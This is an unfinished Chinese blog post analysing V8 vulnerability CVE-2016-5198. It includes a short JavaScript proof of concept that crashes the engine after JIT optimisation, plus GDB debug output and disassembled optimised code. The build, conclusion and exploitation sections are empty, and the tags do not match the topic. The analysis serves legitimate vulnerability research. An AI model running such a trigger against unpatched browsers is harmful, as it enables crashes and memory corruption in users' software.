---
layout:     post
title:      "V8引擎CVE-2016-5198漏洞分析(工事中)"
subtitle:   ""
date:       2019-07-26 10:30:00
author:     "GToad"
header-img: "img/android-five.png"
catalog: true
tags:
    - Android
    - NDK
    - Hook
    - arm64
    - inline hook
    - native hook
    - LTS
---

> 本文为本博客V8系列第五篇。

## 漏洞基本信息

漏洞信息页面
漏洞修复代码

根据漏洞基本信息可准备分析环境，先切换至漏洞修复前版本。
```
git checkout 
gclient sync
```

对源码进行编译。
```

```

## PoC

以下代码执行后V8引擎会直接崩溃。

```javascript
function Ctor() {
  n = new Set();
}
function Check() {
  n.xyz = 0x826852f4;
  parseInt();
}
for(var i=0; i<2000; ++i) {
  Ctor();
}
for(var i=0; i<2000; ++i) {
  Check();
}
Ctor();
Check();
```

![](../img/in-post/post-cve20165198/poc-core-dumped.png)

从PoC来看，应该是Ctor()和Check()两个函数在2000次循环执行后产生了Bug。毫无疑问，又是一个V8在对函数进行JIT优化后由于去除“冗余”类型检查而产生的问题。

## 漏洞成因

#### 调试分析

使用GDB对V8进行调试，首先将PoC改写为易于调试的版本，共有5个断点，分别用GT1-5表示：

```javascript
function Ctor() {
    n = new Set();
}

function Check() {
    n.xyz = 0x826852f4;
    parseInt('AAAAAAAA');
}

print("GT1");
%DebugPrint(Check);
%DebugPrint(Ctor);
%SystemBreak();

for(var i=0; i<2000; ++i) {
    Ctor();
}

print("GT2");
%DebugPrint(Check);
%DebugPrint(Ctor);
%SystemBreak();

for(var i=0; i<2000; ++i) {
    Check();
}

print("GT3");
%DebugPrint(Check);
%DebugPrint(Ctor);
%SystemBreak();

Ctor();
print("GT4");
%DebugPrint(n);
%DebugPrint(Check);
%DebugPrint(Ctor);
%SystemBreak();

Check();
print("GT5");
%DebugPrint(Check);
%DebugPrint(Ctor);
%SystemBreak();
```

###### GT1

```
GT1
DebugPrint: 0xb56bf52ba11: [Function]
 - map = 0xc241b0840f1 [FastProperties]
 - prototype = 0xb56bf5040b9
 - elements = 0x1f8aa5502241 <FixedArray[0]> [FAST_HOLEY_ELEMENTS]
 - initial_map = 
 - shared_info = 0xb56bf52b4c9 <SharedFunctionInfo Check>
 - name = 0xb56bf52aff9 <String[5]: Check>
 - formal_parameter_count = 0
 - context = 0xb56bf503951 <FixedArray[235]>
 - literals = 0x1f8aa5504b21 <FixedArray[1]>
 - code = 0xa6866804481 <Code: BUILTIN>
 - properties = {
   #length: 0x1f8aa55555d9 <AccessorInfo> (accessor constant)
   #name: 0x1f8aa5555649 <AccessorInfo> (accessor constant)
   #arguments: 0x1f8aa55556b9 <AccessorInfo> (accessor constant)
   #caller: 0x1f8aa5555729 <AccessorInfo> (accessor constant)
   #prototype: 0x1f8aa5555799 <AccessorInfo> (accessor constant)
 }

...

DebugPrint: 0xb56bf52b991: [Function]
 - map = 0xc241b0840f1 [FastProperties]
 - prototype = 0xb56bf5040b9
 - elements = 0x1f8aa5502241 <FixedArray[0]> [FAST_HOLEY_ELEMENTS]
 - initial_map = 
 - shared_info = 0xb56bf52b3f9 <SharedFunctionInfo Ctor>
 - name = 0xb56bf52afd9 <String[4]: Ctor>
 - formal_parameter_count = 0
 - context = 0xb56bf503951 <FixedArray[235]>
 - literals = 0x1f8aa5504b21 <FixedArray[1]>
 - code = 0xa6866804481 <Code: BUILTIN>
 - properties = {
   #length: 0x1f8aa55555d9 <AccessorInfo> (accessor constant)
   #name: 0x1f8aa5555649 <AccessorInfo> (accessor constant)
   #arguments: 0x1f8aa55556b9 <AccessorInfo> (accessor constant)
   #caller: 0x1f8aa5555729 <AccessorInfo> (accessor constant)
   #prototype: 0x1f8aa5555799 <AccessorInfo> (accessor constant)
 }

...


```
从输出可以知道，此时Check()和Ctor()方法都处于还未被优化的状态。

###### GT2

```
GT2
DebugPrint: 0xb56bf52ba11: [Function]
 - map = 0xc241b0840f1 [FastProperties]
 - prototype = 0xb56bf5040b9
 - elements = 0x1f8aa5502241 <FixedArray[0]> [FAST_HOLEY_ELEMENTS]
 - initial_map = 
 - shared_info = 0xb56bf52b4c9 <SharedFunctionInfo Check>
 - name = 0xb56bf52aff9 <String[5]: Check>
 - formal_parameter_count = 0
 - context = 0xb56bf503951 <FixedArray[235]>
 - literals = 0x1f8aa5504b21 <FixedArray[1]>
 - code = 0xa6866804481 <Code: BUILTIN>
 - properties = {
   #length: 0x1f8aa55555d9 <AccessorInfo> (accessor constant)
   #name: 0x1f8aa5555649 <AccessorInfo> (accessor constant)
   #arguments: 0x1f8aa55556b9 <AccessorInfo> (accessor constant)
   #caller: 0x1f8aa5555729 <AccessorInfo> (accessor constant)
   #prototype: 0x1f8aa5555799 <AccessorInfo> (accessor constant)
 }

...

DebugPrint: 0xb56bf52b991: [Function]
 - map = 0xc241b0840f1 [FastProperties]
 - prototype = 0xb56bf5040b9
 - elements = 0x1f8aa5502241 <FixedArray[0]> [FAST_HOLEY_ELEMENTS]
 - initial_map = 
 - shared_info = 0xb56bf52b3f9 <SharedFunctionInfo Ctor>
 - name = 0xb56bf52afd9 <String[4]: Ctor>
 - formal_parameter_count = 0
 - context = 0xb56bf503951 <FixedArray[235]>
 - literals = 0xb56bf52bc91 <FixedArray[1]>
 - code = 0xa6866906b61 <Code: OPTIMIZED_FUNCTION>
 - properties = {
   #length: 0x1f8aa55555d9 <AccessorInfo> (accessor constant)
   #name: 0x1f8aa5555649 <AccessorInfo> (accessor constant)
   #arguments: 0x1f8aa55556b9 <AccessorInfo> (accessor constant)
   #caller: 0x1f8aa5555729 <AccessorInfo> (accessor constant)
   #prototype: 0x1f8aa5555799 <AccessorInfo> (accessor constant)
 }

...

```

GT2处，Ctor已经被JIT优化，可以从其code属性中获得其优化后的机器码：

```
pwndbg> job 0xa6866906b61
0xa6866906b61: [Code]
kind = OPTIMIZED_FUNCTION
stack_slots = 5
compiler = crankshaft
Instructions (size = 218)
0xa6866906bc0     0  55             push rbp
0xa6866906bc1     1  4889e5         REX.W movq rbp,rsp
0xa6866906bc4     4  56             push rsi
0xa6866906bc5     5  57             push rdi
0xa6866906bc6     6  4883ec08       REX.W subq rsp,0x8
0xa6866906bca    10  488b45f8       REX.W movq rax,[rbp-0x8]
0xa6866906bce    14  488945e8       REX.W movq [rbp-0x18],rax
0xa6866906bd2    18  488bf0         REX.W movq rsi,rax
0xa6866906bd5    21  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]
0xa6866906bdc    28  7305           jnc 35  (0xa6866906be3)
0xa6866906bde    30  e8fdbcf5ff     call StackCheck  (0xa68668628e0)    ;; code: BUILTIN
0xa6866906be3    35  49bae95b51bf560b0000 REX.W movq r10,0xb56bf515be9    ;; object: 0xb56bf515be9 <JS Function Set (SharedFunctionInfo 0x1f8aa551cb31)>
0xa6866906bed    45  4152           push r10
0xa6866906bef    47  48bae95b51bf560b0000 REX.W movq rdx,0xb56bf515be9    ;; object: 0xb56bf515be9 <JS Function Set (SharedFunctionInfo 0x1f8aa551cb31)>
0xa6866906bf9    57  48bae95b51bf560b0000 REX.W movq rdx,0xb56bf515be9    ;; object: 0xb56bf515be9 <JS Function Set (SharedFunctionInfo 0x1f8aa551cb31)>
0xa6866906c03    67  33c0           xorl rax,rax
0xa6866906c05    69  488b75e8       REX.W movq rsi,[rbp-0x18]
0xa6866906c09    73  488bfa         REX.W movq rdi,rdx
0xa6866906c0c    76  e8af68f3ff     call Construct  (0xa686683d4c0)    ;; code: BUILTIN
0xa6866906c11    81  a801           test al,0x1
0xa6866906c13    83  0f8458000000   jz 177  (0xa6866906c71)
0xa6866906c19    89  49ba0965081b240c0000 REX.W movq r10,0xc241b086509    ;; object: 0xc241b086509 <Map(FAST_HOLEY_SMI_ELEMENTS)>
0xa6866906c23    99  4c3950ff       REX.W cmpq [rax-0x1],r10
0xa6866906c27   103  0f8549000000   jnz 182  (0xa6866906c76)
0xa6866906c2d   109  48bb21c052bf560b0000 REX.W movq rbx,0xb56bf52c021    ;; object: 0xb56bf52c021 PropertyCell for 0x1edd876d4761 <a Set with map 0xc241b086509>
0xa6866906c37   119  4889430f       REX.W movq [rbx+0xf],rax
0xa6866906c3b   123  488d530f       REX.W leaq rdx,[rbx+0xf]
0xa6866906c3f   127  48250000f8ff   REX.W and rax,0xfffffffffff80000
0xa6866906c45   133  f6400802       testb [rax+0x8],0x2
0xa6866906c49   137  7415           jz 160  (0xa6866906c60)
0xa6866906c4b   139  48c7c00000f8ff REX.W movq rax,0xfff80000
0xa6866906c52   146  4823c3         REX.W andq rax,rbx
0xa6866906c55   149  f6400804       testb [rax+0x8],0x4
0xa6866906c59   153  7405           jz 160  (0xa6866906c60)
0xa6866906c5b   155  e8c0f6ffff     call 0xa6866906320       ;; code: STUB, RecordWriteStub, minor: 8707
0xa6866906c60   160  48b8112350a58a1f0000 REX.W movq rax,0x1f8aa5502311    ;; object: 0x1f8aa5502311 <undefined>
0xa6866906c6a   170  488be5         REX.W movq rsp,rbp
0xa6866906c6d   173  5d             pop rbp
0xa6866906c6e   174  c20800         ret 0x8
0xa6866906c71   177  e89ed3d7ff     call 0xa6866684014       ;; deoptimization bailout 2
0xa6866906c76   182  e8a3d3d7ff     call 0xa686668401e       ;; deoptimization bailout 3
0xa6866906c7b   187  90             nop

...

```

###### GT3

```
GT3
DebugPrint: 0xb56bf52ba11: [Function]
 - map = 0xc241b0840f1 [FastProperties]
 - prototype = 0xb56bf5040b9
 - elements = 0x1f8aa5502241 <FixedArray[0]> [FAST_HOLEY_ELEMENTS]
 - initial_map = 
 - shared_info = 0xb56bf52b4c9 <SharedFunctionInfo Check>
 - name = 0xb56bf52aff9 <String[5]: Check>
 - formal_parameter_count = 0
 - context = 0xb56bf503951 <FixedArray[235]>
 - literals = 0xb56bf52c819 <FixedArray[1]>
 - code = 0xa6866906f21 <Code: OPTIMIZED_FUNCTION>
 - properties = {
   #length: 0x1f8aa55555d9 <AccessorInfo> (accessor constant)
   #name: 0x1f8aa5555649 <AccessorInfo> (accessor constant)
   #arguments: 0x1f8aa55556b9 <AccessorInfo> (accessor constant)
   #caller: 0x1f8aa5555729 <AccessorInfo> (accessor constant)
   #prototype: 0x1f8aa5555799 <AccessorInfo> (accessor constant)
 }

...

DebugPrint: 0xb56bf52b991: [Function]
 - map = 0xc241b0840f1 [FastProperties]
 - prototype = 0xb56bf5040b9
 - elements = 0x1f8aa5502241 <FixedArray[0]> [FAST_HOLEY_ELEMENTS]
 - initial_map = 
 - shared_info = 0xb56bf52b3f9 <SharedFunctionInfo Ctor>
 - name = 0xb56bf52afd9 <String[4]: Ctor>
 - formal_parameter_count = 0
 - context = 0xb56bf503951 <FixedArray[235]>
 - literals = 0xb56bf52bc91 <FixedArray[1]>
 - code = 0xa6866906b61 <Code: OPTIMIZED_FUNCTION>
 - properties = {
   #length: 0x1f8aa55555d9 <AccessorInfo> (accessor constant)
   #name: 0x1f8aa5555649 <AccessorInfo> (accessor constant)
   #arguments: 0x1f8aa55556b9 <AccessorInfo> (accessor constant)
   #caller: 0x1f8aa5555729 <AccessorInfo> (accessor constant)
   #prototype: 0x1f8aa5555799 <AccessorInfo> (accessor constant)
 }

...

```

GT3处，Check()也被优化为机器码：
```
pwndbg> job 0xa6866906f21
0xa6866906f21: [Code]
kind = OPTIMIZED_FUNCTION
stack_slots = 5
compiler = crankshaft
Instructions (size = 186)
0xa6866906f80     0  55             push rbp
0xa6866906f81     1  4889e5         REX.W movq rbp,rsp
0xa6866906f84     4  56             push rsi
0xa6866906f85     5  57             push rdi
0xa6866906f86     6  4883ec08       REX.W subq rsp,0x8
0xa6866906f8a    10  488b45f8       REX.W movq rax,[rbp-0x8]
0xa6866906f8e    14  488945e8       REX.W movq [rbp-0x18],rax
0xa6866906f92    18  488bf0         REX.W movq rsi,rax
0xa6866906f95    21  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]
0xa6866906f9c    28  7305           jnc 35  (0xa6866906fa3)
0xa6866906f9e    30  e83db9f5ff     call StackCheck  (0xa68668628e0)    ;; code: BUILTIN
0xa6866906fa3    35  48b821c052bf560b0000 REX.W movq rax,0xb56bf52c021    ;; object: 0xb56bf52c021 PropertyCell for 0x1edd876d4761 <a Set with map 0xc241b08c391>
0xa6866906fad    45  488b400f       REX.W movq rax,[rax+0xf]
0xa6866906fb1    49  49ba0000805e0a4de041 REX.W movq r10,0x41e04d0a5e800000
0xa6866906fbb    59  c4c1f96ec2     vmovq xmm0,r10
0xa6866906fc0    64  488b4007       REX.W movq rax,[rax+0x7]
0xa6866906fc4    68  488b400f       REX.W movq rax,[rax+0xf]
0xa6866906fc8    72  c5fb114007     vmovsd [rax+0x7],xmm0
0xa6866906fcd    77  49ba112350a58a1f0000 REX.W movq r10,0x1f8aa5502311    ;; object: 0x1f8aa5502311 <undefined>
0xa6866906fd7    87  4152           push r10
0xa6866906fd9    89  49ba39b052bf560b0000 REX.W movq r10,0xb56bf52b039    ;; object: 0xb56bf52b039 <String[8]: AAAAAAAA>
0xa6866906fe3    99  4152           push r10
0xa6866906fe5   101  48bf51d850bf560b0000 REX.W movq rdi,0xb56bf50d851    ;; object: 0xb56bf50d851 <JS Function parseInt (SharedFunctionInfo 0x1f8aa553ce11)>
0xa6866906fef   111  488b75e8       REX.W movq rsi,[rbp-0x18]
0xa6866906ff3   115  488b7727       REX.W movq rsi,[rdi+0x27]
0xa6866906ff7   119  498b55a0       REX.W movq rdx,[r13-0x60]
0xa6866906ffb   123  b801000000     movl rax,0x1
0xa6866907000   128  bb02000000     movl rbx,0x2
0xa6866907005   133  e8f6ebefff     call ArgumentsAdaptorTrampoline  (0xa6866805c00)    ;; code: BUILTIN
0xa686690700a   138  48b8112350a58a1f0000 REX.W movq rax,0x1f8aa5502311    ;; object: 0x1f8aa5502311 <undefined>
0xa6866907014   148  488be5         REX.W movq rsp,rbp
0xa6866907017   151  5d             pop rbp
0xa6866907018   152  c20800         ret 0x8
0xa686690701b   155  90             nop

...

```

###### GT4

```
GT4
DebugPrint: 0x1edd876dc641: [JSSet]
 - map = 0xc241b086509 [FastProperties]
 - prototype = 0xb56bf515e49
 - elements = 0x1f8aa5502241 <FixedArray[0]> [FAST_HOLEY_SMI_ELEMENTS] - table = 0x1edd876dc661 <FixedArray[13]>
 - properties = {
 }
0xc241b086509: [Map]
 - type: JS_SET_TYPE
 - instance size: 32
 - inobject properties: 0
 - elements kind: FAST_HOLEY_SMI_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x1f8aa5502311 <undefined>
 - instance descriptors (own) #0: 0x1f8aa5502231 <FixedArray[0]>
 - layout descriptor: 0
 - transitions #1: 0xb56bf52c891 WeakCell for 0xc241b08c391 <Map(FAST_HOLEY_SMI_ELEMENTS)>
     #xyz: (transition to data), attrs: [WEC] -> 0xc241b08c391 <Map(FAST_HOLEY_SMI_ELEMENTS)>
 - prototype: 0xb56bf515e49 <an Object with map 0xc241b086561>
 - constructor: 0xb56bf515be9 <JS Function Set (SharedFunctionInfo 0x1f8aa551cb31)>
 - code cache: 0x1f8aa5502241 <FixedArray[0]>
 - dependent code: 0xb56bf52c559 <FixedArray[3]>
 - construction counter: 0
```

GT4中输出了对象n的地址。

```

```

进一步查看对象n的elements属性，其内存附近情况如下所示：

```

```
可以看到，elements此时应该是一个长度为0的Fixed Array。


#### JIT优化前后对比

#### 结论

## 漏洞利用



